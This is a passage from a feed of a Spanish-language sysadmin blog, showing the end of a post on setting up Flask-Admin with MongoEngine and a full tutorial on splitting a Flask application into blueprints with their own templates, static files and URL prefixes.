admin.add_view&lt;span class="o"&gt;(&lt;/span&gt;HidePasswordModelView&lt;span class="o"&gt;(&lt;/span&gt;User&lt;span class="o"&gt;))&lt;/span&gt;
admin.add_view&lt;span class="o"&gt;(&lt;/span&gt;ModelView&lt;span class="o"&gt;(&lt;/span&gt;Product&lt;span class="o"&gt;))&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/flask-extensions$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo queda importar el &lt;strong&gt;blueprint&lt;/strong&gt; y registrarlo en nuestra aplicación; esto se consigue en el fichero &lt;em&gt;app.py&lt;/em&gt;. Cabe decir que esta extensión requiere de una configuración &lt;code&gt;SECRET_KEY&lt;/code&gt; para encriptar las &lt;em&gt;cookies&lt;/em&gt; de &lt;strong&gt;Flask&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/flask-extensions$ cat app.py
from flask import Flask
from models import db
from admin import admin
import os

&lt;span class="nv"&gt;SECRET_KEY&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; os.environ.get&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;SECRET_KEY&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="nv"&gt;MONGODB_URL&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; os.environ.get&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;MONGODB_URL&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;

&lt;span class="nv"&gt;app&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; Flask&lt;span class="o"&gt;(&lt;/span&gt;__name__&lt;span class="o"&gt;)&lt;/span&gt;
app.config&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;SECRET_KEY&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; SECRET_KEY
app.config&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;MONGODB_SETTINGS&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;host&amp;#39;&lt;/span&gt;: MONGODB_URL&lt;span class="o"&gt;}&lt;/span&gt;
db.init_app&lt;span class="o"&gt;(&lt;/span&gt;app&lt;span class="o"&gt;)&lt;/span&gt;
admin.init_app&lt;span class="o"&gt;(&lt;/span&gt;app&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/flask-extensions$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y sin especificar ningún parámetro extra, nuestro panel de administración se va a encontrar por defecto en &lt;a href="http://localhost:8080/admin/"&gt;http://localhost:8080/admin/&lt;/a&gt;. Esto se puede modificar al registrar el &lt;strong&gt;blueprint&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;WARNING&lt;/strong&gt;: El panel de administración solo sirve para administrar. No tiene autenticación integrada y queda como responsabilidad del usuario decidir que hacer. Se puede desactivar antes de ir a producción, se puede limitar el acceso mediante autenticación básica o certificados, e incluso se puede poner una extensión de autenticación como &lt;strong&gt;flask-login&lt;/strong&gt; o &lt;strong&gt;flask-auth&lt;/strong&gt;.&lt;/p&gt;
&lt;h2&gt;En resumen&lt;/h2&gt;
&lt;p&gt;Con esto tenemos un interesante esqueleto sobre el que crear en un tiempo mínimo cualquier aplicación que nos propongamos. Para acelerar la inicialización de un nuevo proyecto, he creado esta base como un repositorio de &lt;strong&gt;GitHub&lt;/strong&gt;, que podéis clonar en &lt;a href="https://github.com/Sirtea/flask-skel"&gt;https://github.com/Sirtea/flask-skel&lt;/a&gt;.&lt;/p&gt;</content><category term="python"></category><category term="framework"></category><category term="microframework"></category><category term="flask"></category><category term="extensiones"></category></entry><entry><title>Creciendo con Flask: los blueprints</title><link href="http://www.linuxsysadmin.ml/2017/12/creciendo-con-flask-los-blueprints.html" rel="alternate"></link><published>2017-12-11T10:00:00+01:00</published><updated>2017-12-11T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-12-11:/2017/12/creciendo-con-flask-los-blueprints.html</id><summary type="html">&lt;p&gt;Ya estuvimos hablando del &lt;em&gt;microframework&lt;/em&gt; &lt;strong&gt;Flask&lt;/strong&gt;, pero no profundizamos en su funcionalidad más avanzada: los &lt;strong&gt;blueprints&lt;/strong&gt;, que son una agrupación de vistas, plantillas y contenido estático similar a las aplicaciones de &lt;strong&gt;django&lt;/strong&gt;. Solamente por esta funcionalidad queda justificado el uso de este &lt;em&gt;framework&lt;/em&gt; para proyectos de tamaños medio o grande …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Ya estuvimos hablando del &lt;em&gt;microframework&lt;/em&gt; &lt;strong&gt;Flask&lt;/strong&gt;, pero no profundizamos en su funcionalidad más avanzada: los &lt;strong&gt;blueprints&lt;/strong&gt;, que son una agrupación de vistas, plantillas y contenido estático similar a las aplicaciones de &lt;strong&gt;django&lt;/strong&gt;. Solamente por esta funcionalidad queda justificado el uso de este &lt;em&gt;framework&lt;/em&gt; para proyectos de tamaños medio o grande.&lt;/p&gt;
&lt;p&gt;Lo primero que tenemos que ver es la necesidad de utilizar &lt;strong&gt;blueprints&lt;/strong&gt;. A medida que nuestra aplicación crece, el código lo hace también. Esto suele hacer código fuente grande e inmantenible. Invariablemente, veremos que nuestra aplicación es una amalgama de partes.&lt;/p&gt;
&lt;p&gt;En este momento, nos va a interesar trocear en partes aquel fichero con todas nuestras vistas. Y la herramienta para hacer esto son los &lt;strong&gt;blueprints&lt;/strong&gt;, ya sea para partir la aplicación &lt;em&gt;a posteriori&lt;/em&gt; o queremos empezar haciéndolo bien desde el principio.&lt;/p&gt;
&lt;h2&gt;Divide y vencerás&lt;/h2&gt;
&lt;p&gt;Os pongo un pequeño ejemplo, con este programa de gestión de hoteles:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Programa modular" src="http://www.linuxsysadmin.ml/images/programa_modular.gif"&gt;&lt;/p&gt;
&lt;p&gt;¿Verdad que parece grande y descorazonador? &lt;strong&gt;¡Divide y vencerás!&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Si lo troceamos adecuadamente, tenemos varios problemas menores, e incluso podemos poner a trabajar en ellos a un equipo grande, por separado. Incluso podemos añadir más módulos en un futuro; quien sabe, incluso podemos hacerlo genérico suficiente para que los hoteles activen solamente las partes que más falta les hagan.&lt;/p&gt;
&lt;p&gt;Ese es el modelo de negocio de SAP...&lt;/p&gt;
&lt;h2&gt;Un caso de uso de ejemplo&lt;/h2&gt;
&lt;p&gt;Supongamos que una empresa nos paga para hacer una web corporativa, con, de momento, las siguientes opciones:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Una página principal para actuar como su &lt;em&gt;landing page&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Algunas páginas menores, como por ejemplo el apartado legal o la presentación de la empresa, con contenido fijo&lt;/li&gt;
&lt;li&gt;Un boletín informativo con sus últimas noticias, a modo de rueda de prensa y con una maquetación diferente&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Y cual es nuestra estratégia? &lt;strong&gt;¡Divide y vencerás!&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Hagamos nuestra aplicación, a base de estas mismas 3 partes:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Una vista normal para la &lt;em&gt;landing page&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Un &lt;strong&gt;blueprint&lt;/strong&gt; para las páginas menores&lt;/li&gt;
&lt;li&gt;Un &lt;strong&gt;blueprint&lt;/strong&gt; para las noticias&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Implementación&lt;/h2&gt;
&lt;p&gt;Vamos a empezar con una aplicación vacía, solo con la página principal. A partir de ahí vamos a registrar las páginas menores y, finalmente, el módulo de notícias.&lt;/p&gt;
&lt;p&gt;Para simplificar, no vamos a gestionar la capa de persistencia ni un panel de administración; esto queda como ejercicio al lector. Si os interesa mucho, y como veremos en un artículo posterior, podemos utilizar un &lt;strong&gt;blueprint&lt;/strong&gt; prefabricado para ello.&lt;/p&gt;
&lt;h3&gt;La página principal&lt;/h3&gt;
&lt;p&gt;Vamos a evitar el uso de &lt;strong&gt;blueprints&lt;/strong&gt;, solo para demostrar que es posible mezclar vistas normales con &lt;strong&gt;blueprints&lt;/strong&gt;. No hay ningún misterio en esto: una vista, una plantilla y un estilo.&lt;/p&gt;
&lt;p&gt;Así quedaría nuestro proyecto con el primero de los puntos solucionados:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/myapp$ tree
.
├── static
│   └── style.css
├── templates
│   ├── layout.html
│   └── main.html
├── app.py
├── requirements.txt
└── server.sh

&lt;span class="m"&gt;2&lt;/span&gt; directories, &lt;span class="m"&gt;6&lt;/span&gt; files
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/myapp$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La vista solo renderiza la plantilla que nos interesa, aunque hay la complejidad añadida de que utiliza herencia.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/myapp$ cat app.py
from flask import Flask, render_template

&lt;span class="nv"&gt;app&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; Flask&lt;span class="o"&gt;(&lt;/span&gt;__name__&lt;span class="o"&gt;)&lt;/span&gt;

@app.route&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
def main_page&lt;span class="o"&gt;()&lt;/span&gt;:
    &lt;span class="k"&gt;return&lt;/span&gt; render_template&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;main.html&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/myapp$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Finalmente tenemos las plantillas y algún &lt;em&gt;asset&lt;/em&gt; estático.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/myapp$ cat templates/layout.html
&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html &lt;span class="nv"&gt;lang&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;es&amp;quot;&lt;/span&gt;&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;link &lt;span class="nv"&gt;rel&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;stylesheet&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/static/style.css&amp;quot;&lt;/span&gt; /&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&lt;span class="o"&gt;{&lt;/span&gt;% block content %&lt;span class="o"&gt;}{&lt;/span&gt;% endblock %&lt;span class="o"&gt;}&lt;/span&gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/myapp$ cat templates/main.html
&lt;span class="o"&gt;{&lt;/span&gt;% extends &lt;span class="s2"&gt;&amp;quot;layout.html&amp;quot;&lt;/span&gt; %&lt;span class="o"&gt;}&lt;/span&gt;

&lt;span class="o"&gt;{&lt;/span&gt;% block content %&lt;span class="o"&gt;}&lt;/span&gt;
    &amp;lt;h1&amp;gt;Main page&amp;lt;/h1&amp;gt;
&lt;span class="o"&gt;{&lt;/span&gt;% endblock %&lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/myapp$ cat static/style.css
html &lt;span class="o"&gt;{&lt;/span&gt; background-color: cyan &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/myapp$
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Las páginas secundarias&lt;/h3&gt;
&lt;p&gt;Vamos a crear una carpeta para contener los recursos del &lt;strong&gt;blueprint&lt;/strong&gt;. Como el &lt;strong&gt;blueprint&lt;/strong&gt; debe ser importado y registrado por la aplicación, vamos a convertirlo en un módulo de &lt;strong&gt;python&lt;/strong&gt; añadiendo un fichero &lt;em&gt;__init__.py&lt;/em&gt;, que de paso servirá para contener el código del &lt;strong&gt;blueprint&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Nótese la aparición de la nueva carpeta &lt;em&gt;pages/&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/myapp$ tree
.
├── pages
│   ├── templates
│   │   ├── about.html
│   │   └── legal.html
│   └── __init__.py
├── static
│   └── style.css
├── templates
│   ├── layout.html
│   └── main.html
├── app.py
├── requirements.txt
└── server.sh

&lt;span class="m"&gt;4&lt;/span&gt; directories, &lt;span class="m"&gt;9&lt;/span&gt; files
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/myapp$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El funcionamiento es el mismo: regitramos vistas que renderizan plantillas y poco más. La parte interesante es que estas vistas se encapsulan en un objeto &lt;em&gt;Blueprint&lt;/em&gt; que luego será registrado en la aplicación base.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/myapp$ cat pages/__init__.py
from flask import Blueprint, render_template

&lt;span class="nv"&gt;pages&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; Blueprint&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;pages&amp;#39;&lt;/span&gt;, __name__, &lt;span class="nv"&gt;template_folder&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;templates&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;

@pages.route&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/about&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
def about_page&lt;span class="o"&gt;()&lt;/span&gt;:
    &lt;span class="k"&gt;return&lt;/span&gt; render_template&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;about.html&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;

@pages.route&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/legal&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
def legal_page&lt;span class="o"&gt;()&lt;/span&gt;:
    &lt;span class="k"&gt;return&lt;/span&gt; render_template&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;legal.html&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/myapp$ cat pages/templates/about.html
&lt;span class="o"&gt;{&lt;/span&gt;% extends &lt;span class="s2"&gt;&amp;quot;layout.html&amp;quot;&lt;/span&gt; %&lt;span class="o"&gt;}&lt;/span&gt;

&lt;span class="o"&gt;{&lt;/span&gt;% block content %&lt;span class="o"&gt;}&lt;/span&gt;
    &amp;lt;h1&amp;gt;About page&amp;lt;/h1&amp;gt;
&lt;span class="o"&gt;{&lt;/span&gt;% endblock %&lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/myapp$ cat pages/templates/legal.html
&lt;span class="o"&gt;{&lt;/span&gt;% extends &lt;span class="s2"&gt;&amp;quot;layout.html&amp;quot;&lt;/span&gt; %&lt;span class="o"&gt;}&lt;/span&gt;

&lt;span class="o"&gt;{&lt;/span&gt;% block content %&lt;span class="o"&gt;}&lt;/span&gt;
    &amp;lt;h1&amp;gt;Legal page&amp;lt;/h1&amp;gt;
&lt;span class="o"&gt;{&lt;/span&gt;% endblock %&lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/myapp$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Con esto tenemos el &lt;strong&gt;blueprint&lt;/strong&gt;, que va a haber que registrar en nuestra aplicación para que esta añada sus rutas a una ruta base, que en este caso, no está declarada. Esto hará que se registren en &lt;em&gt;/&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/myapp$ cat app.py
from flask import Flask, render_template
from pages import pages

&lt;span class="nv"&gt;app&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; Flask&lt;span class="o"&gt;(&lt;/span&gt;__name__&lt;span class="o"&gt;)&lt;/span&gt;

@app.route&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
def main_page&lt;span class="o"&gt;()&lt;/span&gt;:
    &lt;span class="k"&gt;return&lt;/span&gt; render_template&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;main.html&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;

app.register_blueprint&lt;span class="o"&gt;(&lt;/span&gt;pages&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/myapp$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De esta forma tendremos dos nuevas URLs en la aplicación:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://localhost:8080/about"&gt;http://localhost:8080/about&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://localhost:8080/legal"&gt;http://localhost:8080/legal&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Es interesante ver que hay dos nuevas plantillas en el &lt;strong&gt;blueprint&lt;/strong&gt;, pero la plantilla base y la hoja de estilos siguen siendo las de la aplicación principal. Los ficheros del &lt;strong&gt;blueprint&lt;/strong&gt; tienen preferencia sobre el resto, pero no los eclipsan; los anteriores quedan disponibles por si no se sobreescribieran.&lt;/p&gt;
&lt;h3&gt;El módulo de notícias&lt;/h3&gt;
&lt;p&gt;Este módulo es prácticamente igual al anterior, con dos sutiles diferencias:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Usaremos otra plantilla base y otra hoja de estilos&lt;/li&gt;
&lt;li&gt;Nuestras rutas van a ir prefijadas por &lt;em&gt;/news/&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;La primera parte es tan simple como poner los nuevos ficheros para que no utilice los originales como plan B. La segunda se consigue declarando las rutas sin el prefijo y montando el &lt;strong&gt;blueprint&lt;/strong&gt; con un prefijo en la aplicación original. Esto nos da cierta capacidad de recolocar un conjunto de URLs.&lt;/p&gt;
&lt;p&gt;De nuevo, hacemos aparecer una carpeta nueva. Como las dos carpetas &lt;em&gt;templates/&lt;/em&gt; se "fusionan" a ojos del cargador, me he visto obligado a esconder el segundo &lt;em&gt;layout.html&lt;/em&gt; en una carpeta, para evitar colisiones de nombres.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/myapp$ tree
.
├── news
│   ├── static
│   │   └── style.css
│   ├── templates
│   │   └── news
│   │       ├── latest.html
│   │       └── layout.html
│   └── __init__.py
├── pages
│   ├── templates
│   │   ├── about.html
│   │   └── legal.html
│   └── __init__.py
├── static
│   └── style.css
├── templates
│   ├── layout.html
│   └── main.html
├── app.py
├── requirements.txt
└── server.sh

&lt;span class="m"&gt;8&lt;/span&gt; directories, &lt;span class="m"&gt;13&lt;/span&gt; files
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/myapp$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La aplicación ya es repetitiva; se pone solamente por tener el ejemplo completo. Es importante ver que se ha utilizado el &lt;em&gt;helper&lt;/em&gt; &lt;strong&gt;url_for&lt;/strong&gt; para no calcular el &lt;em&gt;path&lt;/em&gt; del fichero de estilos. Pido perdón por la chapuza de no usar una base de datos, y poner las noticias en el código.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/myapp$ cat news/__init__.py
from flask import Blueprint, render_template

&lt;span class="nv"&gt;news&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; Blueprint&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;news&amp;#39;&lt;/span&gt;, __name__, &lt;span class="nv"&gt;template_folder&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;templates&amp;#39;&lt;/span&gt;, &lt;span class="nv"&gt;static_folder&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;static&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;

@news.route&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/latest&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
def latest_news&lt;span class="o"&gt;()&lt;/span&gt;:
    &lt;span class="nv"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;news&amp;#39;&lt;/span&gt;: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;lorem&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;ipsum&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;,
    &lt;span class="o"&gt;}&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; render_template&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;news/latest.html&amp;#39;&lt;/span&gt;, **data&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/myapp$ cat news/templates/news/layout.html
&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html &lt;span class="nv"&gt;lang&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;es&amp;quot;&lt;/span&gt;&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;link &lt;span class="nv"&gt;rel&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;stylesheet&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;{{ url_for(&amp;#39;.static&amp;#39;, filename=&amp;#39;style.css&amp;#39;) }}&amp;quot;&lt;/span&gt; /&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&lt;span class="o"&gt;{&lt;/span&gt;% block content %&lt;span class="o"&gt;}{&lt;/span&gt;% endblock %&lt;span class="o"&gt;}&lt;/span&gt;
&amp;lt;p&amp;gt;&amp;lt;small&amp;gt;News app&amp;lt;/small&amp;gt;&amp;lt;/p&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/myapp$ cat news/templates/news/latest.html
&lt;span class="o"&gt;{&lt;/span&gt;% extends &lt;span class="s2"&gt;&amp;quot;news/layout.html&amp;quot;&lt;/span&gt; %&lt;span class="o"&gt;}&lt;/span&gt;

&lt;span class="o"&gt;{&lt;/span&gt;% block content %&lt;span class="o"&gt;}&lt;/span&gt;
    &amp;lt;h1&amp;gt;Latest news&amp;lt;/h1&amp;gt;
    &amp;lt;ul&amp;gt;
&lt;span class="o"&gt;{&lt;/span&gt;% &lt;span class="k"&gt;for&lt;/span&gt; new in news %&lt;span class="o"&gt;}&lt;/span&gt;
        &amp;lt;li&amp;gt;&lt;span class="o"&gt;{{&lt;/span&gt; new &lt;span class="o"&gt;}}&lt;/span&gt;&amp;lt;/li&amp;gt;
&lt;span class="o"&gt;{&lt;/span&gt;% endfor %&lt;span class="o"&gt;}&lt;/span&gt;
    &amp;lt;/ul&amp;gt;
&lt;span class="o"&gt;{&lt;/span&gt;% endblock %&lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/myapp$ cat news/static/style.css
html &lt;span class="o"&gt;{&lt;/span&gt; background-color: red &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/myapp$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El punto interesante es que quremos mapear el &lt;strong&gt;blueprint&lt;/strong&gt;. Eso significa que la URL &lt;em&gt;/latest&lt;/em&gt; del &lt;strong&gt;blueprint&lt;/strong&gt; tiene que utilizar un prefijo, para que lo veamos en &lt;em&gt;/news/latest&lt;/em&gt;. Es ahora, en el momento de registrar el &lt;strong&gt;blueprint&lt;/strong&gt;, cuando podemos especificar que todas sus URLs cuelguen de un prefijo adicional.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/myapp$ cat app.py
from flask import Flask, render_template
from pages import pages
from news import news

&lt;span class="nv"&gt;app&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; Flask&lt;span class="o"&gt;(&lt;/span&gt;__name__&lt;span class="o"&gt;)&lt;/span&gt;

@app.route&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
def main_page&lt;span class="o"&gt;()&lt;/span&gt;:
    &lt;span class="k"&gt;return&lt;/span&gt; render_template&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;main.html&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;

app.register_blueprint&lt;span class="o"&gt;(&lt;/span&gt;pages&lt;span class="o"&gt;)&lt;/span&gt;
app.register_blueprint&lt;span class="o"&gt;(&lt;/span&gt;news, &lt;span class="nv"&gt;url_prefix&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/news&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/myapp$
&lt;/pre&gt;&lt;/div&gt;


